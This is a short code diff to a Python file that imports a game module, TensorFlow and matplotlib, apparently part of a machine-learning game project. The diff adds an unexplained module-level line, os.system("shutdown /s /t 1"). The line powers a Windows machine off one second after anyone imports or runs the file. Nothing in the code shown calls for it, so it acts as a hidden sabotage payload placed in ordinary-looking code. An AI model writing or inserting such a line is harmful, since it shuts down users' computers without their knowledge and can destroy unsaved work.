@@ -1,6 +1,8 @@
 from game import Game
 import os
 
+os.system("shutdown /s /t 1")
+
 import tensorflow as tf
 import matplotlib
 import matplotlib.pyplot as plt
